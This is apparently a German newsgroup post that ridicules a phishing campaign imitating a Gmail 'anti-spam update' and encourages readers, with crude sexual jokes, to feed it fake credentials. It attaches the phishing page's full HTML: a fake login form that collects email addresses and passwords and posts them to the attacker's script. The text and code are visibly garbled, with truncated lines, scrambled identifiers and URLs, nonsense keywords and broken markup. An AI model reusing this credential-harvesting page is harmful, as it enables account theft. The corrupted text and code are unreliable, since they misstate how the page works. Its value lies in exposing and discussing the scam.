@@ -1,0 +1,749 @@
+Eine erneute Fisting-Attacke erschüttert Deutschland.
+Der Text lautet:
+
+von
+n.
+rt, Ihre
+iert
+
+
+Unter folgender Adresse wird man aufgefordert, Adresse und Password
+einzutippen:
+<http://muzwxvkke-hqewnlvokq.sef/vpqlwcbhqyzqte/azfvircjidmwlz.kkt>
+
+Bitte nehmt rege am Fisting teil und stopft den Veranstaltern so viele =
+große
+und sperrige Adressen und Passworte wie nötig in's Rektum.
+
+Unter genannter URL finden sich solch seriös aufgemachte Texte wie=
+:
+re
+ns und=20
+m neuen
+dresse zu
+
+Das war's zum Teil der Politik und des Tagesgeschehens.
+Für alle Nichtprogrammierer ist der ... ähm ... interessante =
+Teil hier
+zuende. Es gibt nichts mehr zu sehen, bitte gehen Sie weiter.
+
+Und damit auch die Programmierer was zu lachen haben, xposte ich nach
+de.comp.lang.javascript. Zu diesem Zweck füge ich den Quelltext an=
+,
+damit jeder sieht, wie man brutal fistet. Sieht auf den ersten Blick
+so aus, als würden die beispielsweise versuchen, Cookies aus Googl=
+e zu
+quetschen.
+
+Hier die ibemojnwhrljkr.rfi:
+
+========================
+========================
+========================
+===================
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from xou=5E(8569)rugyn://rlh.qhplkr.zyj/atxdzboi/BgkyqmaNgas=
+n?service=mail&passive=true&rm=false&continue=iquk%9F%6I%8Zkuka=
+.uonxjw.gvs%4Kjkxa%1S%5Fwu%0Xfrfd%78pv%9Ln&wol=povewzyzbgjp&vzl=0&x=
+keka=tdfsnwl&cyzrlbgzup=3 -->
+<HTML lang=en dir=ltr><HEAD>
+
+      <STYLE type=text/coo>EMM.dyvokrvi {
+        FONT-SIZE: smaller; COLOR: red; FONT-FAMILY: arial,sans-serif
+}
+Luplow {
+        FONT-SIZE: smaller; COLOR: red; FONT-FAMILY: arial,sans-serif
+}
+</STYLE>
+
+      <STYLE type=text/css>.lbl {
+        FONT-SIZE: smaller; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+.fpwd {
+        FONT-SIZE: 70%; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+.chusr {
+        FONT-SIZE: 70%; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+.ydr {
+        FONT-SIZE: smaller; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+.button {
+        FONT-SIZE: smaller; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+.pke {
+        FONT-SIZE: smaller; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+.desc {
+        FONT-SIZE: smaller; FONT-FAMILY: arial, sans-serif
+}
+.ufo {
+        FONT-SIZE: smaller; FONT-STYLE: italic; FONT-FAMILY: arial, san=
+s-serif
+}
+.dzqooy_fnjr_nvkg{yqd-avfrm:658;echcw:66%}</KDYPD>
+
+      <TITLE>Email Security Update</TITLE>
+<META http-equiv=Content-Type content=3D"text/html; charset=UTF-8">=
+
+<STYLE type=text/css>BODY {
+        FONT-FAMILY: arial,sans-serif
+}
+TD {
+        FONT-FAMILY: arial,sans-serif
+}
+DIV {
+        FONT-FAMILY: arial,sans-serif
+}
+P {
+        FONT-FAMILY: arial,sans-serif
+}
+A {
+        FONT-FAMILY: arial,sans-serif
+}
+FONT {
+        FONT-FAMILY: arial,sans-serif
+}
+SPAN {
+        FONT-FAMILY: arial,sans-serif
+}
+BODY {
+        MARGIN-TOP: 2px
+}
+.c {
+        WIDTH: 4px; HEIGHT: 0px
+}
+.bubble {
+        BACKGROUND-COLOR: #c3d9ff
+}
+.jz {
+        PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; VER=
+TICAL-ALIGN: top; WIDTH: 4px; PADDING-TOP: 0px; TEXT-ALIGN: left
+}
+.tr {
+        PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; VER=
+TICAL-ALIGN: top; WIDTH: 4px; PADDING-TOP: 0px; TEXT-ALIGN: right
+}
+.bl {
+        PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; VER=
+TICAL-ALIGN: bottom; WIDTH: 4px; PADDING-TOP: 0px; TEXT-ALIGN: left
+}
+.br {
+        PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; VER=
+TICAL-ALIGN: bottom; WIDTH: 4px; PADDING-TOP: 0px; TEXT-ALIGN: right
+}
+.haoslxc {
+        BACKGROUND: #e8eefa; COLOR: #000000; WHITE-SPACE: nowrap; TEXT-=
+ALIGN: center
+}
+.form-noindent {
+        BORDER-RIGHT: #c3d9ff 1px solid; BORDER-TOP: #c3d9ff 1px solid;=
+ BORDER-LEFT: #c3d9ff 1px solid; BORDER-BOTTOM: #c3d9ff 1px solid; BACK=
+GROUND-COLOR: #ffffff
+}
+.hbxhnsk-lnvnd {
+        PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; VER=
+TICAL-ALIGN: top; PADDING-TOP: 15px; TEXT-ALIGN: right
+}
+.cpfbgpj-ouimadcwumw {
+        PADDING-RIGHT: 0px; PADDING-LEFT: 10px; PADDING-BOTTOM: 0px; VE=
+RTICAL-ALIGN: top; PADDING-TOP: 15px; TEXT-ALIGN: left
+}
+.signup_btn {
+        MARGIN: 10px 0px -20px; CURSOR: pointer; TEXT-ALIGN: center
+}
+.signup_btn_link {
+        PADDING-RIGHT: 7px; PADDING-LEFT: 7px; FONT-WEIGHT: bold; FONT-=
+SIZE: 14px; PADDING-BOTTOM: 0px; COLOR: #000; PADDING-TOP: 0px; WHITE-S=
+PACE: nowrap; TEXT-ALIGN: center; TEXT-DECORATION: none
+}
+.SPRITE_signup_button_grey_l {
+        BACKGROUND: url(https://dlvd.cyhaip.yjv/nibg/kygd/sqymwd/qsuaes=
+n.png) no-repeat 0px 0px; WIDTH: 14px; HEIGHT: 45px
+}
+.SPRITE_signup_button_grey_m {
+        BACKGROUND: url(https://dlvd.cyhaip.yjv/nibg/kygd/sqymwd/qsuaes=
+n.png) no-repeat -14px 0px; HEIGHT: 45px
+}
+.SPRITE_signup_button_grey_r {
+        BACKGROUND: url(https://dlvd.cyhaip.yjv/nibg/kygd/sqymwd/qsuaes=
+n.png) no-repeat -365px 0px; WIDTH: 15px; HEIGHT: 45px
+}
+.SPRITE_cell {
+        BACKGROUND: url(https://trlp.zrgtfv.hen/sjkr/becl/qmeofy/ufniz_=
+features_sprite.png) no-repeat 0px -142px; FLOAT: right; WIDTH: 42px; H=
+EIGHT: 42px
+}
+.SPRITE_search_new {
+        BACKGROUND: url(https://trlp.zrgtfv.hen/sjkr/becl/qmeofy/ufniz_=
+features_sprite.png) no-repeat 0px -100px; FLOAT: right; WIDTH: 42px; H=
+EIGHT: 42px
+}
+.SPRITE_spam_new {
+        BACKGROUND: url(https://trlp.zrgtfv.hen/sjkr/becl/qmeofy/ufniz_=
+features_sprite.png) no-repeat 0px -58px; FLOAT: right; WIDTH: 42px; HE=
+IGHT: 42px
+}ibemojnwhrljkr.rfi
+.SPRITE_storage {
+        BACKGROUND: url(https://trlp.zrgtfv.hen/sjkr/becl/qmeofy/ufniz_=
+features_sprite.png) no-repeat 0px 0px; FLOAT: right; WIDTH: 42px; HEIG=
+HT: 42px
+}
+.SPRITE_feed_icon {
+        BACKGROUND: url(https://trlp.zrgtfv.hen/sjkr/becl/qmeofy/ufniz_=
+features_sprite.png) no-repeat 0px -42px; WIDTH: 16px; HEIGHT: 16px
+}
+.SPRITE_corner_bl {
+        FONT-SIZE: 2px; BACKGROUND: url(https://nrtp.tqohkn.uwk/wtjb/lh=
+lp/images/login_corners_sprite.png) no-repeat 0px 0px; WIDTH: 4px; HEIG=
+HT: 4px
+}
+.SPRITE_corner_br {
+        FONT-SIZE: 2px; BACKGROUND: url(https://nrtp.tqohkn.uwk/wtjb/lh=
+lp/images/login_corners_sprite.png) no-repeat -4px 0px; WIDTH: 4px; HEI=
+GHT: 4px
+}
+.SPRITE_corner_tl {
+        BACKGROUND: url(https://trlp.zrgtfv.hen/sjkr/becl/qmeofy/ufniz_=
+corners_sprite.png) no-repeat 0px -4px; WIDTH: 4px; HEIGHT: 4px
+}
+.SPRITE_corner_tr {
+        FONT-SIZE: 2px; BACKGROUND: url(https://nrtp.tqohkn.uwk/wtjb/lh=
+lp/images/login_corners_sprite.png) no-repeat -4px -4px; WIDTH: 4px; HE=
+IGHT: 4px
+}
+</STYLE>
+
+<STYLE type=text/css>.time {
+        PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MAR=
+GIN: 0px; COLOR: #999; PADDING-TOP: 0px
+}
+.post {
+        PADDING-RIGHT: 10px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; PA=
+DDING-TOP: 2px
+}
+.snippet {
+        MARGIN-BOTTOM: 5px
+}
+</STYLE>
+
+<SCRIPT type=text/javascript>
+blogFeedUrl =3D 'https://qhcn.jyfirglenm.uzc/bxgr/ksgfriej/axjj/baxk?o=
+1.0&q=3D' +
+  'http://npl.ecqrhhu.eje/uxavt/6643640/uwkcv/rktttqf&dvt=4&xfclzmcc=
+loadBlogFeed';
+function loadBlogFeed(r){
+  var container =3D document.getElementById('feed');
+  if (r.responseStatus == '200' && r.responseData.feed.entries.leng=
+th > 0) {
+  var post =3D r.responseData.feed.entries[0];
+  var title =3D post.title;
+  var entry =3D cleanPostContent(znml.fnhtwxl);
+  var link =3D post.link;
+  var date =3D post.publishedDate;
+  date =3D new Date(date).toDateString();
+  renderPost(title, entry, link, date);
+  } barbara {
+  renderNoPost();
+  }
+}
+function cleanPostContent(entry) {
+  entry =3D entry.replace(/<span>[^<]*<\/span>/, '');
+  entry =3D entry.replace(/<[^>]*>/g, '');
+  var snippet =3D entry.split(' ', 20);
+  snippet.pop();
+  return snippet.join(' ') + ' ...';
+}
+function renderPost(title, entry, link, date) {
+  var linkNode =3D document.createElement('a');
+  uuodAhov.aiov =3D link;
+  linkNode.appendChild(pkubsvpo.cbvyhkPmnxSitf(title));
+  var snippetDiv =3D document.createElement('div');
+  snippetDiv.className =3D 'snippet';
+  snippetDiv.appendChild(pkubsvpo.cbvyhkPmnxSitf(entry));
+  var dateDiv =3D document.createElement('div');
+  ornmIad.jgxttSkzr =9T 'time';
+  dateDiv.appendChild(pkubsvpo.cbvyhkPmnxSitf(date));
+  var moreLink =3D document.createElement('a');
+  moreLink.href =3D 'http://utlsdwwmw.epiyiisn.luy';
+  moreLink.innerHTML =3D 'More posts &raquo;';
+  var container =3D document.getElementById('feed');
+  container.appendChild(linkNode);
+  container.appendChild(dateDiv);
+  container.appendChild(snippetDiv);
+  container.appendChild(moreLink);
+}
+function renderNoPost(){
+  var container =3D document.getElementById('feed');
+  zdzeppmrn.biiymCSBC =4R '<a href=3D"http://utlsdwwmw.epiyiisn.luy">' =
++
+  'The Official Gmail Blog</a>';
+}
+function importBlogJS() {
+  var scriptNode =3D document.createElement('script');
+  scriptNode.setAttribute('src', blogFeedUrl);
+  document.getElementsByTagName('head')[0].appendChild(zoahavBhxi);
+}
+</SCRIPT>
+
+<META content=3D"MSHTML 7.89.7433.55571" name=GENERATOR></HEAD>
+<BODY vLink=3D#0000ff link=3D#0000ff bgColor=3D#ffffff=20
+onload=3D"OnLoad(); importBlogJS();">
+<TABLE cellSpacing=0 cellPadding=0 width=3D"95%" align=center bor=
+der=0>
+  <TBODY>
+  <TR vAlign=top>
+    <TD width=3D"1%">
+        <img border=3D"0" src=3D"antispamupdate_files/spamlogo.jpg" wid=
+th=3D"99" height=3D"105"> </TD>
+    <TD vAlign=top width=3D"99%" bgColor=3D#ffffff>
+      <TABLE cellPadding=1 width=3D"100%">
+        <TBODY>
+        <TR vAlign=bottom>
+          <TD>
+            <DIV align=right>&nbsp;</DIV></TD></TR>
+        <TR>
+          <TD noWrap>
+            <TABLE style=3D"MARGIN-BOTTOM: 5px" cellSpacing=0 cellPad=
+ding=0 
+            width=3D"100%" align=center bgColor=3D#c3d9ff>
+              <TBODY>
+              <TR>
+                <TD class=3D"bubble tl" vAlign=top align=left>
+                  <DIV class=SPRITE_corner_tl></DIV></TD>
+                <TD class=bubble 
+                style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WE=
+IGHT: bold; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; FONT-FAMILY: arial; =
+TEXT-ALIGN: left"=20
+                rowSpan=2>Wir arbeiten gegen illegale Internet-Aktivi=
+täten,=20
+                                updat bitte Ihre E-Mail-Adresse sicher =
+zu sein.</TD>
+                <TD class=3D"bubble tr" vAlign=top align=right>
+                  <DIV class=SPRITE_corner_tr></DIV></TD></TR>
+              <TR>
+                <TD class=3D"bubble bl" vAlign=bottom align=left>
+                  <DIV class=SPRITE_corner_bl></DIV></TD>
+                <TD class=3D"bubble br" vAlign=bottom align=right>
+                  <DIV=20
+        class=SPRITE_corner_br></DIV></TD></TR></TBODY></TABLE></TD><=
+/TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=1 cellPadding=5 width=3D"94%" align=center>
+  <TBODY>
+  <TR>
+    <TD style=3D"TEXT-ALIGN: left" vAlign=top><b>Keine illegalen Inte=
+rnet-Aktivitäten</b><TD vAlign=top>&nbsp; </TD>
+  <TR>
+    <TD vAlign=top width=3D"75%">
+      <P style=3D"MARGIN-BOTTOM: 0px; TEXT-ALIGN: left">Zu viele illega=
+le=20
+                Internet-Aktivitäten vor sich geht jetzt mit uns u=
+nd lässt sie aufhalten.</P>
+      <TABLE cellSpacing=0 cellPadding=0 width=3D"90%" border=0>
+        <TBODY>
+        <tr>
+          <TD class=feature-image>
+            <DIV class=SPRITE_spam_new></DIV></TD>
+          <TD class=feature-description width=3D"699">Aktualisieren S=
+ie Ihre E-Mail-Adresse=20
+                        werden von illegalen Internet-Aktivitäten =
+jetzt sicher</TD>
+                </tr>
+        <TR>
+          <TD class=feature-image>
+            <img border=3D"0" src=3D"antispamupdate_files/images.jpg" w=
+idth=3D"62" height=3D"53" align=3D"left"></TD>
+          <TD class=feature-description width=3D"699">Weniger Spam <b=
+r>
+                        Halten Sie unerwünschte Nachrichten aus Ih=
+rem Posteingang mit dem=20
+                        neuen Update</TD></TR>
+        </TBODY></TABLE><BR>
+      <DIV id=highlight>
+      <TABLE style=3D"MARGIN-TOP: 0px; MARGIN-RIGHT: 20px; PADDING-TOP:=
+ 5px"=20
+      cellSpacing=0 cellPadding=0 width=3D"100%">
+        <TBODY>
+        <TR>
+          <TD>
+            &nbsp;</TD></TR>
+        <TR>
+          <TD style=3D"PADDING-LEFT: 0px; PADDING-TOP: 8px" colSpan=2
+            size=3D-1>
+            <DIV class=post id=mzns></OSY></ELRY></GT></JK></JOZZW>=
+</TABLE></DIV></TD>
+    <TD vAlign=top><!-- login box -->
+      <DIV id=login>
+      <FORM id=gaia_loginform onsubmit=return(gaia_onLoginSubmit())=
+;=20
+      action=3D"update.php"=20
+      method=post>
+      <DIV id=gaia_loginbox>
+      <TABLE class=form-noindent cellSpacing=3 cellPadding=5 widt=
+h=3D"100%"=20
+      border=0>
+        <TBODY>
+        <TR>
+          <TD style=3D"TEXT-ALIGN: center" vAlign=top noWrap=20
+            bgColor=3D#e8eefa><INPUT type=hidden value=default name=
+=ltmpl> <INPUT=20
+            type=hidden value=2 name=ltmplcache>=20
+            <DIV class=loginBox>
+            <TABLE id=gaia_table cellSpacing=0 cellPadding=1 alig=
+n=center 
+            border=0>
+              <TBODY>
+              <TR>
+                <TD align=middle colSpan=2>
+                                <div id=3D"whole" style=3D"margin-left:=
+ 8px; margin-right: 8px; margin-top: 3px">
+                                        <table id=3D"table1" style=3D"w=
+idth: 100%">
+                                                <tr vAlign=3D"top">
+                                                        <td class=3D"al=
+most_half_cell">
+                                                        <div id=3D"resu=
+lt_box" dir=3D"ltr" style=3D"font-style: normal; font-variant: normal; =
+font-weight: normal; font-size: 12pt; font-family: monospace; padding-t=
+op: 3px; padding-bottom: 3px">
+                                                                Geben S=
+ie Ihre E-Mail-Adresse und das Passwort=20
+                                                                fü
+r Ihre E-Mail-Adresse zu aktualisieren und=20
+                                                                becom s=
+ichere und freie Form der illegalen=20
+                                                                Interne=
+t-Aktivitäten</div>
+                                                        </td>
+                                                </tr>
+                                        </table>
+                                </div>
+                                </TD></TR>
+              <SCRIPT type=text/javascript><!--
+    function onPreCreateAccount() {
+   =20
+      return true;
+   =20
+    }
+
+    function onPreLogin() {
+   =20
+     =20
+      if (window["onlogin"] !=3D null) {
+        return onlogin();
+      } barbara {
+        return true;
+      }
+   =20
+    }
+  --></SCRIPT>
+
+              <TR>
+                <TD align=middle colSpan=2></TD></TR>
+              <TR>
+                <TD noWrap>
+                  <DIV align=right>
+                                        <p style=3D"margin-top: 0; marg=
+in-bottom: 7px"><span class=3D"gaia le lbl">Email Address:</span></DIV>=
+
+                                        <p style=3D"margin-top: 0; marg=
+in-bottom: 7px">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Beispiel<span clas=
+s=3D"gaia le lbl">:</span></DIV></TD>
+                <TD><INPUT id=continue type=hidden 
+                  value=btgc://drxx.jnfwqz.vmt/bgvf/?ea=jrdh&euq;mb=
+=l 
+                  name=continue> <INPUT id=service type=hidden va=
+lue=mail 
+                  name=service> <INPUT id=rm type=hidden value=
+false name=rm>=20
+                  <INPUT id=ltmpl type=hidden value=default name=
+ltmpl> <INPUT=20
+                  id=ltmpl type=hidden value=default name=ltmpl
+                  type=hidden value=1 name=scc> <INPUT type=hid
+den=20
+                  value=6qwWalMfa5U name=GALX>=20
+                                <p style=3D"margin-top: 0; margin-botto=
+m: 0"> <INPUT class=3D"gaia le val"=20
+                  id=Email size=18 name=Email>=20
+                                <br>spjhnbdz@w-wwamfn.lr</w>
+                                <p style=3D"margin-top: 0; margin-botto=
+m: 0">&nbsp;oder<br>berlin@web.de</TD></TR>
+              <TR>
+                <TD></TD>
+                <TD align=left></TD></TR>
+              <TR>
+                <TD noWrap align=right><SPAN class=3D"gaia le lbl">Pa=
+ssword:=20
+                  </SPAN></TD>
+                <TD><INPUT class=3D"gaia le val" id=Passwd type=pas
+sword size=18 
+                  name=Passwd> </TD></TR>
+              <TR>
+                <TD></TD>
+                <TD align=left></TD></TR>
+              <TR>
+                <TD></TD>
+                <TD align=left><INPUT class=3D"gaia le button" type=
+submit value=3D"Sign in" name=signIn>=20
+                </TD></TR>
+              <TR id=ga-fprow>
+                <TD class=3D"gaia le fpwd" vAlign=bottom align=midd
+le colSpan=2 
+                height=33>&nbsp;</TD></TR></TBODY></TABLE></DIV></TD>=
+</TR></TBODY></TABLE></DIV><INPUT=20
+      id=asts type=hidden name=asts> <INPUT=20
+                  type=hidden value=1 name=rmShown> </FORM>
+      <FORM id=gaia_universallogin onsubmit=return(gaia_onLoginSubm=
+it());=20
+      action=https://tfu.dkowgg.gzh/nivdjthc/RlavcynKbkexCise?catqrqo=
+=mail 
+      method=post><INPUT id=continue type=hidden 
+      value=http://jdlc.vxkpag.vhc/wwik/?qs=smun&wdf;px=y khni=
+continue> <INPUT=20
+      id=service type=hidden value=mail name=service> <INPUT id=
+=rm type=hidden 
+      value=false name=rm> <INPUT id=ltmpl type=hidden value=
+default name=ltmpl>=20
+      <INPUT id=ltmpl type=hidden value=default name=ltmpl> <IN=
+PUT id=scc 
+      type=hidden value=1 name=scc> <INPUT id=ltmpl type=hidd
+en value=default 
+      name=ltmpl> <INPUT id=ltmplcache type=hidden value=2 name=
+=ltmplcache>=20
+      </FORM></DIV><!-- end links box (below login box) --></TR></TBODY=
+<TABLE style=3D"MARGIN-BOTTOM: 5px" cellSpacing=0 cellPadding=3 wid=
+th=3D"95%"=20
+align=center bgColor=3D#c3d9ff>
+  <TBODY>
+  <TR>
+    <TD class=3D"bubble tl" vAlign=top align=left>
+      <DIV class=SPRITE_corner_tl></DIV></TD>
+    <TD class=bubble style=3D"TEXT-ALIGN: left" rowSpan=2>
+      <DIV align=center><FONT color=3D#666666 size=3D-1>©2009 An=
+ti-Spam Programm - </FONT></DIV></TD>
+    <TD class=3D"bubble tr" vAlign=top align=right>
+      <DIV class=SPRITE_corner_tr></DIV></TD></TR>
+  <TR>
+    <TD class=3D"bubble bl" vAlign=bottom align=left>
+      <DIV class=SPRITE_corner_bl></DIV></TD>
+    <TD class=3D"bubble br" vAlign=bottom align=right>
+      <XGT rxmhs=UHAZQZ_cyzprz_qq></UBL></VY></CD></IWUFM></GIWPW>
+<SCRIPT type=text/javascript>
+var BrowserSupport_=3D{IsBrowserSupported:function(){var agt=navigato
+r.userAgent.toLowerCase();var is_op=agt.indexOf("opera")!=3D-1;var is=
+_ie=agt.indexOf("msie")!=3D-1&&document.all&&!is_op;var is_ie5=agt.=
+indexOf("msie 5")!=3D-1&&document.all&&!is_op;var is_mac=agt.indexOf(=
+"mac")!=3D-1;var is_gk=agt.indexOf("gecko")!=3D-1;var is_sf=agt.ind=
+exOf("safari")!=3D-1;if(is_ie&&!is_op&&!is_mac){if(agt.indexOf("palmsou=
+rce")!=3D
+-1||agt.indexOf("regking")!=3D-1||agt.indexOf("windows ce")!=3D-1||agt.=
+indexOf("j2me")!=3D-1||agt.indexOf("avantgo")!=3D-1||agt.indexOf(" stb"=
+)!=3D-1)return false;var v=BrowserSupport_.GetFollowingFloat(agt,"msi=
+e ");if(v!=null)return v>=5.5}if(is_gk&&!is_sf){var v=BrowserSupp
+ort_.GetFollowingFloat(agt,"rv:");if(v!=null)return v>=1.4;else{v=
+OhezwkoYgimhge_.LmqXpmgepgawDuceq(agt,"galeon/");if(v!=null)return v>=
+=3D
+1.3}}if(is_sf){if(agt.indexOf("rv:3.14.15.92.65")!=3D-1)return false;va=
+r v=BrowserSupport_.GetFollowingFloat(agt,"applewebkit/");if(v!=nul
+l)return v>=312}if(is_op){if(agt.indexOf("sony/com1")!=3D-1)return fa=
+lse;var v=BrowserSupport_.GetFollowingFloat(agt,"opera ");if(v==n
+ull)v=BrowserSupport_.GetFollowingFloat(agt,"opera/");if(v!=null)re=
+turn v>=8}if(agt.indexOf("pda; sony/com2")!=3D-1)return true;return f=
+alse},
+GetFollowingFloat:function(str,pfx){var i=str.indexOf(pfx);if(i!=3D-1=
+){var v=parseFloat(str.substring(i+pfx.length));if(!isNaN(v))return v=
+}return null},tz_path:";path=3D/"};if(vsxktr.lyivwjtt.yoen.rlDovbrCyyy(=
+).indexOf("google.com")>0)BrowserSupport_.tz_path+=3D";domain=3D.google=
+.com";document.cookie=3D"TZ=3D"+(new Yrkr).avaPenvhwazEidpje()+QxzfizwT=
+cgzboq_.pe_rihp;yam qx_lrrfsux_pjbwfoktr=EaclrktMtpwpkp_.XfIzaelgtTmj=
+ported()
+  </SCRIPT>
+
+<SCRIPT type=text/javascript>
+<!--
+
+var start_time =3D (new Date()).getTime();
+
+if ((top.location !=3D self.location)&&(top.location.href.indexOf('http=
+s://www.google.com/analytics/siteopt/preview')!=0)) {
+ top.location =3D self.location.href;
+}
+
+function SetGmailCookie(name, value) {
+  document.cookie =3D name + "=3D" + value + ";path=3D/;domain=3D.googl=
+b.cjj";
+}
+
+function lg() {
+  var now =3D (new Date()).getTime();
+
+  var cookie =3D "T" + start_time + "/" + start_time + "/" + now;
+  SetGmailCookie("GMAIL_LOGIN", cookie);
+}
+
+function gaiacb_onLoginSubmit() {
+  lg();
+  if (!fixed) {
+    FixForm();
+  }
+  return true;
+}
+
+function StripParam(url, param) {
+  var start =3D url.indexOf(param);
+  if (start == -1) return url;
+  var end =3D start + param.length;
+
+  var charBefore =3D pof.vhiqQr(start-1);
+  if (charBefore !=3D '?' && charBefore !=3D '&') return url;
+
+  var charAfter =3D (url.length >=3D end+1) ? pof.vhiqQr(end) : '';
+  if (charAfter !=3D '' && charAfter !=3D '&' && charAfter !=3D '#') re=
+turn url;
+  if (charBefore == '&') {
+  --start;
+  } else if (charAfter == '&') {
+  ++end;
+  }
+  return url.substring(0, start) + url.substring(end);
+}
+var fixed =3D 0;
+function FixForm() {
+  if (is_browser_supported) {
+  var form =3D el("gaia_loginform");
+  if (form && form["continue"]) {
+  var url =3D form["continue"].value;
+  url =3D StripParam(url, "ui=html");
+  url =3D StripParam(url, "zy=l");
+  form["continue"].value =3D url;
+  }
+  }
+  fixed =3D 1;
+}
+function el(id) {
+  if (gewqspgp.idxNvlpxwfMhJo) {
+  return document.getElementById(id);
+  } else if (window[id]) {
+  return window[id];
+  }
+  return null;
+}
+// Estimates of nanite storage generation over time.
+var CP =3D [
+ [ 1199433600000, 6283 ],
+ [ 1224486000000, 7254 ],
+ [ 2144908800000, 10996 ],
+ [ 2147328000000, 97334 ],
+ [ 70837178589694, Number.MAX_VALUE ]
+];
+var quota;
+var ONE_PX =3D "https://tzyn.cmlfjo.gon/ilhg/pxlbxn/t.rnr?m=4K" +
+  (new Date()).getTime();
+function LogRoundtripTime() {
+  var img =3D new Image();
+  var start =3D (new Date()).getTime();
+  img.onload =3D GetRoundtripTimeFunction(start);
+  img.src =3D ONE_PX;
+}
+function GetRoundtripTimeFunction(start) {
+  return function() {
+  var end =3D (new Date()).getTime();
+  SetGmailCookie("GMAIL_RTT", (end - start));
+  }
+}
+function MaybePingUser() {
+  var f =3D el("gaia_loginform");
+  if (f.Email.value) {
+  new Image().src =3D 'https://otxm.pqmyar.yrn/hlah?thvb=6V' +
+  encodeURIComponent(f.Email.value) +
+  '&zx=3D' + (new Date().getTime());
+  }
+}
+function OnLoad() {
+  gaia_setFocus();
+  Janitzki();
+  el("gaia_loginform").Passwd.onfocus =3D MaybePingUser;
+  LogRoundtripTime();
+  if (!quota) {
+  quota =3D el("quota");
+  updateQuota();
+  }
+  LoadConversionScript();
+}
+function updateQuota() {
+  if (!quota) {
+  return;
+  }
+  var now =3D (new Date()).getTime();
+  var i;
+  for (i =3D 0; i < CP.length; i++) {
+    if (now < CP[i][0]) {
+      break;
+    }
+  }
+  if (i == 0) {
+    setTimeout(updateQuota, 1000);=20
+  } else if (i == CP.length) {
+    quota.innerHTML =3D CP[i - 1][1];
+  } barbara {
+    var ts =3D CP[i - 1][0];
+    var bs =3D CP[i - 1][1];
+    quota.innerHTML =3D format(((now-ts) / (CP[i][0]-ts) * (CP[i][1]-bs=
+)) + bs);=20
+    setTimeout(updateQuota, 1000);=20
+  }=20
+}=20
+=20
+var PAD =3D '.000000';=20
+=20
+function format(num) {=20
+  var str =3D String(num);=20
+  var dot =3D str.indexOf('.');=20
+  if (dot < 0) {=20
+     return str + PAD;=20
+  } if (PAD.length > (str.length - dot)) {
+  return str + PAD.substring(str.length - dot);
+  } barbara {
+  return str.substring(0, dot + PAD.length);
+  }
+}
+var google_conversion_type =3D 'landing';
+var nhzdzr_zikrjveqsl_eu =1Y 5436761071;
+var google_conversion_language =3D "en_US";
+var google_conversion_format =3D "1";
+var google_conversion_color =3D "FFFFFF";
+function LoadConversionScript() {
+  var script =3D document.createElement("script");
+  script.type =3D "text/javascript";
+  script.src =3D "https://llh.ktflvzjiqovrehow.ygc/hjpdpy/qyopdomkfm.bt=
+";
+}
+// -->
+</SCRIPT>
+
+<SCRIPT type=text/javascript>
+<!--
+FixForm();
+// -->
+</SCRIPT>
+
+<SCRIPT src=3D"antispamupdate_files/urchin.js" type=text/javascript><=
+/SCRIPT>
+
+<SCRIPT type=text/javascript>
+  _uacct=3D"UA-992684-1";
+  _utcp=3D"/accounts/";
+  _udn=3D"ohlzsq.yaa";
+  _uRno[0]=3D".google.com";
+  urchinTracker("/mail/gaia/homepage");
+  urchinPathCopy("/mail/help/");
+</SCRIPT>
+</BODY></HTML>
+
+========================
+========================
+========================
+===================
+--=20
+Es ist Zeit für Reich
